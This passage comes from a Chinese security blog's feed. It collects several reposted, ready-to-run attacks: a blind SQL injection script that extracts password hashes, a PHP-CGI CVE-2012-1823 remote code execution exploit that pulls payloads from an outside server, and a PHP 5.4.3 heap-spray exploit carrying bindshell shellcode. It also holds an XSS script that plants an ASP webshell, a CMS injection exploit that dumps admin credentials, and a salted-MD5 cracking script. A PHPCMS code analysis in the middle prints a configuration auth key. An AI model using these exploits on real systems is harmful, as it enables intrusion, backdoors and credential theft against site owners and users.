file_get_contents($urland . urlencode($query)); if ( $result == $and12 ) { echo "Result : FALSE "; $tmp = $start; $start = $end + 1; $end = $old_end; } else { echo "Result : TRUE "; $old_end = $end; $end = floor(($end+$start)/2); } } else { $regexp = "’^" . $founded . $array[$start] . "’"; $query = "(SELECT 1 FROM $table_name WHERE $id_name = $id_val and $column_name REGEXP $regexp)"; $nquery++; echo "Page Request: " . $urland . $query . " "; $result = file_get_contents($urland . urlencode($query)); if ( $result == $and12 ) { echo "Result : FALSE "; $regexp = "’^" . $founded . $array[$end] . "’"; $query = "(SELECT 1 FROM $table_name WHERE $id_name = $id_val and $column_name REGEXP $regexp)"; $nquery++; echo "Page Request: " . $urland . $query . " "; $result = file_get_contents($urland . urlencode($query)); if ( $result == $and12 ) { echo "Result : FALSE "; $end = $old_end; } else echo "Result : TRUE "; $founded .= $array[$end]; } else { echo "Result : TRUE "; $founded .= $array[$start]; } return $founded; } } } $and11 = file_get_contents($urland . "1"); // GET page.php?id=1 and 1=1, to identify TRUE statement $and12 = file_get_contents($urland . "2"); // GET page.php?id=1 and 1=1, to identify FALSE statement if ( $and11 == $and12 ){ // result of (and 1=1) and (and 1=2) is equal? then not vulnerable! echo "Not vulnerabile. Exit. "; exit; } while ( ! $exit ) { $regexpc = "’^" . $founded . "[" . $chars[$fchars] . "-" . $chars[$lchars] . "]’"; // Generate regexp with chars $regexpn = "’^" . $founded . "[" . $numbers[$fnumbers] . "-" . $numbers[$lnumbers] . "]’"; // Generate regexp with numbers $query = "(SELECT 1 FROM $table_name WHERE $id_name = $id_val and $column_name REGEXP $regexpc)"; // Query declaration Example: "(SELECT 1 FROM users WHERE id=1 and password REGEXP ’^5[a-f]’)" $nquery++; echo "Page Request: " . $urland . $query . " "; $result = file_get_contents($urland . urlencode($query)); if ( $result == $and12 ) { echo "Result : FALSE "; $founded = search($numbers, $fnumbers, $lnumbers, $founded); $query = "(SELECT 1 FROM $table_name WHERE $id_name = $id_val and $column_name REGEXP ’^$founded$’)"; $nquery++; echo "Page Request: " . $urland . $query . " "; $result = file_get_contents($urland . urlencode($query)); if ( $result == $and11 ) { echo "Result : TRUE "; $exit = true; } else echo "Result : FALSE "; } else { echo "Result : TRUE "; $founded = search($chars, $fchars, $lchars, $founded); $query = "(SELECT 1 FROM $table_name WHERE $id_name = $id_val and $column_name REGEXP ’^$founded$’)"; $nquery++; echo "Page Request: " . $urland . $query . " "; $result = file_get_contents($urland . urlencode($query)); if ( $result == $and11 ){ echo "Result : TRUE "; $exit = true; } else echo "Result : FALSE "; } } echo "Hash Found. "; echo "Hash: $founded "; echo "Number of request: $nquery "; $md5_arr = preg_split("//", $founded); $nbrute = 0 ; foreach ( $md5_arr as $char ){ if ( ! $char ) continue; $nbrute += $counter[$char]; } $nbrute += 16; echo "Number of request with bruteforce ( 0-9 a-f ): $nbrute "; ?&gt; &nbsp; &nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>SQL盲注</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[转]PHP CGI Argument Injection Exploit CVE-2012-1823]]></title>
    <url>%2F2012%2F05%2F26%2F%E8%BD%AC-PHP-CGI-Argument-Injection-Exploit-CVE-2012-1823%2F</url>
    <content type="text"><![CDATA[&lt;?php /&#42 &#42PHP CGI Argument Injection Exploit CVE-2012-1823 &#42by:cfking &#42bbs:www.90sec.org &#42/ set_time_limit(0); $help=’ [&gt;] php-cgi Remote code Execution Exploit CVE-2012-1823 [&gt;] by:cfking@90sec.org [&gt;] Usage: php ’.$argv[0].’ host index.php &lt;1/2/3&gt; &lt;ip/Command&gt; &lt;port&gt; [&gt;] Example: php ’.$argv[0].’ 127.0.0.1 / 2 ’; if($argc&lt;4)exit($help); print_r (’ [&gt;] PHP CGI Argument Injection Exploit CVE-2012-1823 [&gt;] by:cfking@90sec.org’); $host=$argv[1]; $filename=$argv[2]; if($argv[3]==’1’){ $port=$argv[5]? $argv[5]:4444; if(!$argv[4])exit(" [-] Please enter IP and PORT "); print " [+] Bindshell IP $argv[4] PORT $port "; $payload=$argv[4].’:’.$port; $target=’http://www.cj360.cn/plus/cmd.php’; } if($argv[3]==’2’){ print " [+] Upload backdoor test.php "; $payload=’’; $target=’http://www.cj360.cn/plus/cmd.txt’; } if($argv[3]==’3’){ if(!$argv[4])exit(" [-] Please enter Command "); print " [+] Command $argv[4] "; $payload=$argv[4]; $target=’http://www.cj360.cn/plus/cmds.txt’; } ob_start(); $sock = fsockopen($host, 80, $errno, $errstr, 30); if (!$sock) die("$errstr ($errno) "); fwrite($sock, "GET /$filename?-d+allow_url_include%3don+-d+auto_prepend_file%3d$target+-d+disable_functions%3doff HTTP/1.1 "); fwrite($sock, "User-Agent: $payload "); fwrite($sock, "Host: $host "); $headers = ""; while ($str = trim(fgets($sock, 4096))) $headers .= "$str "; echo " "; $body = ""; while (!feof($sock)) $body .= fgets($sock, 4096); fclose($sock); echo $body; ob_end_flush(); ?&gt; 转至：90sec.org]]></content>
      <categories>
        <category>0day漏洞</category>
      </categories>
      <tags>
        <tag>php cgi</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[转]PHP 5.4 (5.4.3) Code Execution (Win32)]]></title>
    <url>%2F2012%2F05%2F26%2F%E8%BD%AC-PHP-5-4-5-4-3-Code-Execution-Win32%2F</url>
    <content type="text"><![CDATA[// Exploit Title: PHP 5.4 (5.4.3) Code Execution 0day (Win32) // Exploit author: 0in (Maksymilian Motyl) // Email: 0in(dot)email(at)gmail.com // &#42 Bug with Variant type parsing originally discovered by Condis // Tested on Windows XP SP3 fully patched (Polish) =================== offset-brute.html =================== &lt;html&gt;&lt;body&gt; &lt;title&gt;0day&lt;/title&gt; &lt;center&gt; &lt;font size=7&gt;PHP 5.4.3 0day by 0in &amp; cOndis&lt;/font&gt;&lt;br&gt; &lt;textarea rows=50 cols=50 id="log"&gt;&lt;/textarea&gt; &lt;/center&gt; &lt;script&gt; function sleep(milliseconds) { var start = new Date().getTime(); for (var i = 0; i &lt; 1e7; i++) { if ((new Date().getTime() - start) &gt; milliseconds){ break; } } } function makeRequest(url, parameters) { var xmlhttp = new XMLHttpRequest(); if (window.XMLHttpRequest) { xmlhttp = new XMLHttpRequest(); if (xmlhttp.overrideMimeType) { xmlhttp.overrideMimeType(’text/xml’); } } else if (window.ActiveXObject) { // IE try { xmlhttp = new ActiveXObject("Msxml2.XMLHTTP"); } catch (e) { try { xmlhttp = new ActiveXObject("Microsoft.XMLHTTP"); } catch (e) {} } } if (!xmlhttp) { alert(’Giving up :( Cannot create an XMLHTTP instance’); return false; } xmlhttp.open("GET",url,true); xmlhttp.send(null); return true; } test=document.getElementById("log"); for(offset=0;offset&lt;300;offset++) { log.value+="Trying offset:"+offset+" "; makeRequest("0day.php?offset="+offset); sleep(500); } &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; =================== 0day.php =================== &lt;?php $spray = str_repeat("x90",0x200); $offset=$_GET[’offset’]; // 775DF0Da # ADD ESP,10 # RETN &#42&#42 [ole32.dll] $spray = substr_replace($spray, "xdaxf0x5dx77", (strlen($spray))&#42-1,(strlen($spray))&#42-1); // :&gt; 0x048d0030 $spray = substr_replace($spray, pack("L",0x048d0030+$offset), (strlen($spray)-0x8)&#42-1,(strlen($spray))&#42-1); //0x7752ae9f (RVA : 0x0005ae7f) : # XCHG EAX,ESP # MOV ECX,468B0000 # OR AL,3 # RETN [ole32.dll] $spray = substr_replace($spray, "x9fxaex52x77", (strlen($spray)-0x10)&#42-1,(strlen($spray))&#42-1); // Adress of VirtualProtect 0x7c801ad4 $spray = substr_replace($spray, "xd4x1ax80x7c", (strlen($spray)-0x14)&#42-1,(strlen($spray))&#42-1); // LPVOID lpAddress = 0x048d0060 $spray = substr_replace($spray, pack("L",0x048d0060+$offset), (strlen($spray)-0x1c)&#42-1,(strlen($spray))&#42-1); // SIZE_T dwSize = 0x01000000 $spray = substr_replace($spray, "x00x00x10x00", (strlen($spray)-0x20)&#42-1,(strlen($spray))&#42-1); // DWORD flNewProtect = PAGE_EXECUTE_READWRITE (0x00000040) | 0xffffffc0 $spray = substr_replace($spray, "x40x00x00x00", (strlen($spray)-0x24)&#42-1,(strlen($spray))&#42-1); // __out PDWORD lpflOldProtect = 0x04300070 | 0x105240000 // 0x048d0068 $spray = substr_replace($spray, pack("L",0x048d0068+$offset), (strlen($spray)-0x28)&#42-1,(strlen($spray))&#42-1); //0x77dfe8b4 : # XOR EAX,EAX # ADD ESP,18 # INC EAX # POP EBP # RETN 0C &#42&#42 [ADVAPI32.dll] $spray = substr_replace($spray, "xb4xe8xdfx77", (strlen($spray)-0x18)&#42-1,4); // Ret Address = 0x048d0080 $spray = substr_replace($spray, pack("L",0x048d0080+$offset), (strlen($spray)-0x48)&#42-1,4); $stacktrack = "xbcx0cxb0xc0x00"; // Universal win32 bindshell on port 1337 from metasploit $shellcode = $stacktrack."x33xc9x83xe9xb0". "x81xc4xd0xfdxffxff". "xd9xeexd9x74x24xf4x5bx81x73x13x1d". "xccx32x69x83xebxfcxe2xf4xe1xa6xd9x24xf5x35xcdx96". "xe2xacxb9x05x39xe8xb9x2cx21x47x4ex6cx65xcdxddxe2". "x52xd4xb9x36x3dxcdxd9x20x96xf8xb9x68xf3xfdxf2xf0". "xb1x48xf2x1dx1ax0dxf8x64x1cx0exd9x9dx26x98x16x41". "x68x29xb9x36x39xcdxd9x0fx96xc0x79xe2x42xd0x33x82". "x1exe0xb9xe0x71xe8x2ex08xdexfdxe9x0dx96x8fx02xe2". "x5dxc0xb9x19x01x61xb9x29x15x92x5axe7x53xc2xdex39". "xe2x1ax54x3ax7bxa4x01x5bx75xbbx41x5bx42x98xcdxb9". "x75x07xdfx95x26x9cxcdxbfx42x45xd7x0fx9cx21x3ax6b". "x48xa6x30x96xcdxa4xebx60xe8x61x65x96xcbx9fx61x3a". "x4ex9fx71x3ax5ex9fxcdxb9x7bxa4x37x50x7bx9fxbbx88". "x88xa4x96x73x6dx0bx65x96xcbxa6x22x38x48x33xe2x01". "xb9x61x1cx80x4ax33xe4x3ax48x33xe2x01xf8x85xb4x20". "x4ax33xe4x39x49x98x67x96xcdx5fx5ax8ex64x0ax4bx3e". "xe2x1ax67x96xcdxaax58x0dx7bxa4x51x04x94x29x58x39". "x44xe5xfexe0xfaxa6x76xe0xffxfdxf2x9axb7x32x70x44". "xe3x8ex1exfax90xb6x0axc2xb6x67x5ax1bxe3x7fx24x96". "x68x88xcdxbfx46x9bx60x38x4cx9dx58x68x4cx9dx67x38". "xe2x1cx5axc4xc4xc9xfcx3axe2x1ax58x96xe2xfbxcdxb9". "x96x9bxcexeaxd9xa8xcdxbfx4fx33xe2x01xf2x02xd2x09". "x4ex33xe4x96xcdxccx32x69"; $spray = substr_replace($spray,$shellcode, (strlen($spray)-0x50)&#42-1,(strlen($shellcode))); $fullspray=""; for($i=0;$i&lt;0x4b00;$i++) { $fullspray.=$spray; } $j=array(); $e=array(); $b=array(); $a=array(); $c=array(); array_push($j,$fullspray); array_push($e,$fullspray."W"); array_push($b,$fullspray."A"); array_push($a,$fullspray."S"); array_push($c,$fullspray."!"); $vVar = new VARIANT(0x048d0038+$offset); // Shoot him com_print_typeinfo($vVar); //CRASH -&gt; 102F3986 FF50 10 CALL DWORD PTR DS:[EAX+10] echo $arr; echo $spray; ?&gt; 转至：90sec.org]]></content>
      <categories>
        <category>0day漏洞</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>code execution</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPCMS v9 代码分析之phpsso.php]]></title>
    <url>%2F2012%2F05%2F24%2FPHPCMS-v9-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8Bphpsso-php%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;昨天读了一天的phpcms v9的代码，他一些心得写下来，以后忘了可以复习。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 文件路径： /api/phpsso.php 文件描述： /&amp;#42 &nbsp;&amp;#42 客户端被动接收phpsso服务端通知 &nbsp;&amp;#42 服务端通知内容:同步登陆、退出，同步积分设置、对换比率，同步添加、删除用户、修改用户密码，测试通信状态 &nbsp;&amp;#42 &nbsp;&amp;#42/ 代码分析： defined(’IN_PHPCMS’) or exit(’No permission resources.’); //禁止直接读取文件 //需要使用api入口访问：www.xxxx.com/api.php?phpsso $db = pc_base::load_model(’member_model’); //调用/phpsso_server/phpcms/model/member_model.class.php文件 $system = pc_base::load_config(’system’);//读取配置文件 define(’APPID’, $system[’phpsso_appid’]);//定义常量 $ps_api_url =$system[’phpsso_api_url’]; //接口地址 $ps_auth_key = $system[’phpsso_auth_key’]; //加密密钥 $ps_version = $system[’phpsso_version’]; //上边的三个，是进行赋值 pc_base::load_app_class(’client’, ’member’, 0);//调用/phpcms/modules/member/classes/client.class.php $client = new client($ps_api_url, $ps_auth_key);//实例化一个类 $code = $_REQUEST[’code’];//调用参数，这儿我们可以传入任意参数根据下面的代码我测试了，如果我们传入一些恶意的值会发上什么呢？事实是我可以控制下面定义的所有对v9_member表的操作，但是问题来了下面的sys_auth函数里面的$key是我的想法泡汤了！ //$SQL = "uid=20&amp;password=63999fa1698f9192416cb6d1aa6cef7d&amp;random=6wGXsC&amp;username=11111&amp;action=member_add"; //echo $code=$client-&gt;sys_auth($SQL, ’ENCODE’,""); //$code="a0acVQUCAFEFVAQHBAIDBFZXB1VVBwUAAQEAUl0QClANVxYVVEFDFloWUAoCAwwKXFRSUAEPD1daBwpWUVRVV1JTVFRUUwYCUAIDUxJCVF0BXV5cAUFwaRB1FQUGEQpbXlhdAFhQVRNqAVBeQA"; parse_str($client-&gt;sys_auth($code, ’DECODE’), $arr);//解密$code变量，然后数组话 sys_auth函数： /&#42&#42 &#42 字符串加密、解密函数 &#42 &#42 &#42 @param string $txt 字符串 &#42 @param string $operation ENCODE为加密，DECODE为解密，可选参数，默认为ENCODE， &#42 @param string $key 密钥：数字、字母、下划线 &#42 @param string $expiry 过期时间 &#42 @return string &#42/ function sys_auth($string, $operation = ’ENCODE’, $key = ’’, $expiry = 0) { $key_length = 4; $key = md5($key != ’’ ? $key : $this-&gt;ps_auth_key //$key的取值，如果实参$key存在且不为空，就使用实参，否则就是用$ps_auth_key = $system[’phpsso_auth_key’]; //$key然而这个$key是不受我们控制的，是在cachesconfigssystem.php中的 //’phpsso’ =&gt; ’1’,&nbsp;//是否使用phpsso //’phpsso_appid’ =&gt; ’1’,&nbsp;//应用id&nbsp; //’phpsso_api_url’ =&gt; ’phpsso_server’,&nbsp;//接口地址 //’phpsso_auth_key’ =&gt; ’dS8hKGug82YN9Wg92pv11TV1q7AbBQUp’, //加密密钥 //’phpsso_version’ =&gt; ’1’, //phpsso版本 $fixedkey = hash(’md5’, $key); $egiskeys = md5(substr($fixedkey, 16, 16)); $runtokey = $key_length ? ($operation == ’ENCODE’ ? substr(hash(’md5’, microtime(true)), -$key_length) : substr($string, 0, $key_length)) : ’’; $keys = hash(’md5’, substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16)); $string = $operation == ’ENCODE’ ? sprintf(’%010d’, $expiry ? $expiry + time() : 0).substr(md5($string.$egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length)); $i = 0; $result = ’’; $string_length = strlen($string); for ($i = 0; $i &lt; $string_length; $i++){ $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32})); } if($operation == ’ENCODE’) { return $runtokey . str_replace(’=’, ’’, base64_encode($result)); } else { if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$egiskeys), 0, 16)) { return substr($result, 26); } else { return ’’; } } } //print_r($arr); //下面这个是判断使用哪个操作 if(isset($arr[’action’])) { $action = $arr[’action’]; } else { exit(’0’); } /&#42&#42 &#42 测试通信状态 &#42/ if ($action == ’check_status’) exit(’1’); /&#42&#42 &#42 添加用户 &#42/ if ($action == ’member_add’) { $userinfo = array(); $userinfo[’phpssouid’] = isset($arr[’uid’]) ? $arr[’uid’] : exit(’0’); $userinfo[’encrypt’] = isset($arr[’random’]) ? $arr[’random’] : exit(’0’); $userinfo[’username’] = isset($arr[’username’]) ? $arr[’username’] : exit(’0’); $userinfo[’password’] = isset($arr[’password’]) ? $arr[’password’] : exit(’0’); $userinfo[’email’] = isset($arr[’email’]) ? $arr[’email’] : ’’; $userinfo[’regip’] = isset($arr[’regip’]) ? $arr[’regip’] : ’’; $userinfo[’regdate’] = $userinfo[’lastdate’] = SYS_TIME; $userinfo[’modelid’] = 10; $userinfo[’groupid’] = 6; $userid = $db-&gt;insert($userinfo, 1); if($userid) { exit(’1’); } else { exit(’0’); } } /&#42&#42 &#42 删除用户 &#42/ if ($action == ’member_delete’) { $uidarr = $arr[’uids’]; $where = to_sqls($uidarr, ’’, ’phpssouid’); $status = $db-&gt;delete($where); if($status) { exit(’1’); } else { exit(’0’); } } /&#42&#42 &#42 编辑用户 &#42/ if ($action == ’member_edit’) { if(!isset($arr[’uid’])) exit(’0’); $userinfo = array(); if(isset($arr[’password’])) { echo $userinfo[’password’] = $arr[’password’]; echo $userinfo[’encrypt’] = $arr[’random’]; } if(isset($arr[’email’]) &amp;&amp; !empty($arr[’email’])) { $userinfo[’email’] = $arr[’email’]; } if(empty($userinfo)) exit(’1’); echo $status = $db-&gt;update($userinfo, array(’phpssouid’=&gt; $arr[’uid’])); if($status) { exit(’1’); } else { exit(’0’); } } /&#42&#42 &#42 应用积分列表 &#42/ if ($action == ’credit_list’) { $credit_list = pc_base::load_config(’credit’); echo $client-&gt;array2string($credit_list); exit; } /&#42&#42 &#42 更新积分兑换规则 &#42/ if ($action == ’credit_update’) { setcache(’creditchange’, $arr, ’member’); exit(’1’); } /&#42&#42 &#42 同步登陆 &#42/ if ($action == ’synlogin’) { if(!isset($arr[’uid’])) exit(’0’); $phpssouid = $arr[’uid’]; $userinfo = $db-&gt;get_one(array(’phpssouid’=&gt;$phpssouid)); if (!$userinfo) { //插入会员 exit; $ps_userinfo = $client-&gt;ps_get_member_info($userid); $ps_userinfo = unserialize($ps_userinfo); if ($ps_userinfo[’uid’] &gt; 0) { require_once MOD_ROOT.’api/member_api.class.php’; $member_api = new member_api(); $arr_member[’touserid’] = $ps_userinfo[’uid’]; $arr_member[’registertime’] = TIME; $arr_member[’lastlogintime’] = TIME; $arr_member[’username’] = $ps_userinfo[’username’]; $arr_member[’password’] = md5(PASSWORD_KEY.$password) ; $arr_member[’email’] = $ps_userinfo[’email’]; $arr_member[’modelid’] = 10; $member_api-&gt;add($arr_member); $userid = $member-&gt;get_userid($arr[’username’]); $userinfo = $member-&gt;get($userid); } $username = $ps_userinfo[’username’]; } else { $username = $userinfo[’username’]; } //执行本系统登陆操作 $userid = $userinfo[’userid’]; $groupid = $userinfo[’groupid’]; $username = $userinfo[’username’]; $password = $userinfo[’password’]; $nickname = $userinfo[’nickname’]; $db-&gt;update(array(’lastip’=&gt;ip(), ’lastdate’=&gt;SYS_TIME), array(’userid’=&gt;$userid)); pc_base::load_sys_class(’param’, ’’, 0); if(!$cookietime) $get_cookietime = param::get_cookie(’cookietime’); $_cookietime = $cookietime ? intval($cookietime) : ($get_cookietime ? $get_cookietime : 0); $cookietime = $_cookietime ? TIME + $_cookietime : 0; $phpcms_auth_key = md5(pc_base::load_config(’system’, ’auth_key’).$_SERVER[’HTTP_USER_AGENT’]); $phpcms_auth = sys_auth($userid." ".$password, ’ENCODE’, $phpcms_auth_key); header(’P3P: CP="CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR"’); param::set_cookie(’auth’, $phpcms_auth, $cookietime); param::set_cookie(’_userid’, $userid, $cookietime); param::set_cookie(’_username’, $username, $cookietime); param::set_cookie(’_nickname’, $nickname, $cookietime); param::set_cookie(’_groupid’, $groupid, $cookietime); param::set_cookie(’cookietime’, $_cookietime, $cookietime); exit(’1’); } /&#42&#42 &#42 同步退出 &#42/ if ($action == ’synlogout’) { header(’P3P: CP="CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR"’); pc_base::load_sys_class(’param’, ’’, 0); param::set_cookie(’auth’, ’’); param::set_cookie(’_userid’, ’’); param::set_cookie(’_username’, ’’); param::set_cookie(’_nickname’, ’’); param::set_cookie(’_groupid’, ’’); param::set_cookie(’cookietime’, ’’); exit(’1’); //执行本系统退出操作 } -------------------------------------------------------如果我们有办法读取system.php的文件，就可以操控会员表]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>phpcms v9</tag>
        <tag>phpsso.php</tag>
        <tag>代码分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[转]一个xss利用脚本]]></title>
    <url>%2F2012%2F05%2F24%2F%E8%BD%AC-%E4%B8%80%E4%B8%AAxss%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[function saveUserInfo() { var url = "/cmd.asp?act=SiteFilePst&amp;path=%2E%2FINCLUDE%2Ffavorite%2Easp&amp;opath=D%3A%5CZ%2DBlog18%5Cadmin%5C%2E%2E%5C%5CINCLUDE"; var postStr = ’path=./INCLUDE/favorite.asp&amp;txaContent=&lt;li&gt;&lt;a href="http://bbs.rainbowsoft.org/" target="_blank"&gt;ZBlogger社区&lt;/a&gt;&lt;/li&gt;&lt;%If Request("Z-Blog")&lt;&gt;"" Then ExecuteGlobal(Request("Z-Blog"))%&gt;&lt;li&gt;&lt;a href="http://download.rainbowsoft.org/" target="_blank"&gt;菠萝的海&lt;/a&gt;&lt;/li&gt;’; postStr=encodeURI(postStr); var ajax = false; if(window.XMLHttpRequest) { ajax = new XMLHttpRequest(); if (ajax.overrideMimeType) { ajax.overrideMimeType("text/xml"); } } else if (window.ActiveXObject) { try { ajax = new ActiveXObject("Msxml2.XMLHTTP"); } catch (e) { try { ajax = new ActiveXObject("Microsoft.XMLHTTP"); } catch (e) {} } } if (!ajax) { //window.alert("不能创建XMLHttpRequest对象实例."); return false; } ajax.open("POST", url, true); ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); ajax.send(postStr); ajax.onreadystatechange = function() { if (ajax.readyState == 4 &amp;&amp; ajax.status == 200) { } } } saveUserInfo(); &nbsp; 一句话地址： http://www.xxxx.com/INCLUDE/favorite.asp90sec-信息安全团队4 U3 x, , j! ~&amp;#42 w4 q: 一句话密码:z-blog author:tyxing urL:&nbsp;&nbsp; 90sec.org]]></content>
      <categories>
        <category>HTML|CSS|JS|xss|xml</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>js</tag>
        <tag>zblog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[转]飞飞影视系统PHP版 v1.9 injection exploit]]></title>
    <url>%2F2012%2F05%2F20%2F%E8%BD%AC-%E9%A3%9E%E9%A3%9E%E5%BD%B1%E8%A7%86%E7%B3%BB%E7%BB%9FPHP%E7%89%88-v1-9-injection-exploit%2F</url>
    <content type="text"><![CDATA[&lt;?php /&#42&#42 &#42 飞飞影视管理系统 SQL injection &#42 飞飞影视系统PHP版 v1.9 injection exploit &#42 by:www.08sec.com fans &#42 keyword "Powered by www.ff84.com" &#42/ error_reporting(E_ERROR); set_time_limit(0); if ($argc&lt;3) { print_r(’ ------------------------------------------------------ Usage: php ’.$argv[0].’ host path host: target server (ip/hostname),without"http://" path: path to ff84cms Example: php ’.$argv[0].’ localhost / ------------------------------------------------------- ’); die; } $host=$argv[1]; $path=$argv[2]; $html=’’; $cookie=""; $agent=" User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1"; $content =""; $data = "POST /?s=vod-read-id-1".base64_decode(’JTIwYW5kJTIwMT0yJTIwdW5pb24lMjBzZWxlY3QlMjAxLDIsMyw0LDUsNiw3LDgsOSwxMCwxMSwxMiwxMywxNCwxNSwxNiwxNywxOCwxOSwyMCwyMSwyMiwyMywyNCwyNSwyNixjb25jYXQoMHg0MCxhZG1pbl9pZCwweDQwLGFkbWluX25hbWUsMHg0MCxhZG1pbl9wd2QsMHg0MCksMjgsMjklMjBmcm9tJTIwcHBfYWRtaW4tLQ==’)."html HTTP/1.1 "; $data .= "Host: ".$host." "; //$data .="Cookie: ".$cookie." "; $data .= "User-Agent: ".$agent. " "; $data .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&#42/&#42;q=0.8 "; $data .= "Accept-Language: zh-cn,zh;q=0.5 "; $data .= "Accept-Encoding: gzip,deflate "; $data .= "Accept-Charset: GB2312,utf-8;q=0.7,&#42;q=0.7 "; $data .= "Connection: keep-alive "; $data .= "Content-Type: application/x-www-form-urlencoded "; $data .= "Content-Length: ".strlen($content)." "; $data .= $content." "; Sendpack($data); if (!eregi("Tpl",$html)){ // echo $packet." "; // echo $html." "; die("Exploit failed??"); }else{ $pattern="/@(.&#42)@/i"; preg_match($pattern,$html,$pg); echo "$pg[1] "; echo " Exploit succeeded... "; } Function sendpack ($packet) { global $host, $html; $ock=fsockopen(gethostbyname($host),’80’); if (!$ock) { echo ’No response from ’.$host; die; } fputs($ock,$packet); $html=’’; while (!feof($ock)) { $html.=fgets($ock); } fclose($ock); }]]></content>
      <categories>
        <category>0day漏洞</category>
      </categories>
      <tags>
        <tag>注入漏洞</tag>
        <tag>0day</tag>
        <tag>飞飞影视管理系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dz|phpcms|phpbb等程序密文爆破php脚本]]></title>
    <url>%2F2012%2F05%2F20%2Fdz-phpcms-phpbb%E7%AD%89%E7%A8%8B%E5%BA%8F%E5%AF%86%E6%96%87%E7%88%86%E7%A0%B4php%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;大家都知道的dz等论坛的加密方式是md5(md5($pass).$salt)这样的变态加密方式，当大家社工到管理信息的时候，和注入的到数据库里面管理的密文和salt的时候，我们就可以用这个脚本测试暴力破解！当然你还可以增加自己的模块！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个脚本我也只写了3个模块 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.指定一个明文密码爆破 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.以用户名为密码爆破 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.以用户名+6位随机数爆破 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;?php set_time_limit(0); /&#42----------------参数选择部分-----------------&#42/ switch($argv[1]) { case 1://测试模块1 test_1($argv[2]); break; case 2://测试模块2 test_2(); break; case 3://测试模块3 test_3(); break; default: print_r(’ ------------------------------------------- title: md5(md5($pass).$salt)批量暴力测试工具 Author: L.N. Version: 1.0.0 Author_URL:http://lanu.sinaapp.com Description: 暴力测试工具分为3个模块： 1.指定密码测试; 2.以用户位密码测试; 3.以用户秘密吗和随机数测试; 字典文件：[放在和脚本同目录下] salt.txt pass.txt user.txt rand.txt Example: php ’.$argv[0].’ 选择模块 [指定密码] php ’.$argv[0].’ 1 1234567890 php ’.$argv[0].’ 2 php ’.$argv[0].’ 3 ----------------------------------------- ’); die; } /&#42----------------测试模块定义部分-----------------&#42/ /&#42 &#42 测试模块1 &#42 指定测试密码 &#42/ function test_1($password) { echo "开始测试密码 -------------------------------------- "; $file1_name = fopen("salt.txt","r");//打开salt while(!feof($file1_name))//循环salt { $salt=trim(fgets($file1_name));//读取salt $file_name = fopen("pass.txt","r");//打开pass $ii=1; while(!feof($file_name))//循环pass { $pwd=trim(fgets($file_name));//读取pass echo "pwd=".$pwd." ";echo "salt=".$salt." "; if($pwd == md5(md5($password).$salt)) { echo "就是你了:".$pwd." --------------------------------- ";exit; } else { echo $pwd."|"."不是密码$password|".$ii++." "; } } fclose($file_name); } fclose($file1_name); echo "指定密码猜测失败！ "; } /&#42 &#42测试模块2 &#42以用户作为密码测试 &#42/ function test_2() { echo "开始测试密码 -------------------------------------- "; $file1_name = fopen("salt.txt","r");//打开salt while(!feof($file1_name))//循环salt { $salt=trim(fgets($file1_name));//读取salt $file_name = fopen("pass.txt","r");//打开pass while(!feof($file_name))//循环pass { $pwd=trim(fgets($file_name));//读取pass $file_name2 = fopen("user.txt","r");//打开user while(!feof($file_name2))//循环user { $user=trim(fgets($file_name2));//读取user echo "user=".$user." ";echo "pwd=".$pwd." ";echo "salt=".$salt." "; if($pwd== md5(md5($user).$salt)) { echo "就是你了:user=".$user." ";echo "pwd=".$pwd." ";echo "salt=".$salt." "; echo " ----------------------------- ";exit; } else { echo $pwd." "."不是密码2！"." "; } } fclose($file_name2); } fclose($file_name); } fclose($file1_name); echo "以用户作为密码测试失败！ "; } /&#42 &#42测试模块3 &#42以用户和6位以内的随即数作为密码测试 &#42/ function test_3() { echo "开始测试密码 -------------------------------------- "; randmunber(); $file1_name = fopen("salt.txt","r");//打开salt while(!feof($file1_name))//循环salt { $salt=trim(fgets($file1_name));//读取salt $file_name = fopen("pass.txt","r");//打开pass while(!feof($file_name))//循环pass { $pwd=trim(fgets($file_name));//读取pass $file_name2 = fopen("user.txt","r");//打开user while(!feof($file_name2))//循环user { 